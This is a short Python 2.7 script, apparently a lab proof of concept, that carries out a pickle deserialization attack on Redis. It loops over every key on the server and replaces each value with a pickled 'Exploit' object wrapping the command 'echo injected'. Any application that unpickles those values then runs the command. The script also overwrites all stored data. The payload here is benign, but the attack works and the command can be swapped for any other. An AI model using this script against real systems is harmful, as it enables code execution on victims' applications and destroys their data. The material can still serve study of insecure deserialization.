#!/usr/bin/env python2.7
import redis
import pickle

from exploit import Exploit

r = redis.Redis(host='redis')

for key in r.scan_iter():
    print key
    r.set(key, pickle.dumps(Exploit(['echo', 'injected'])))
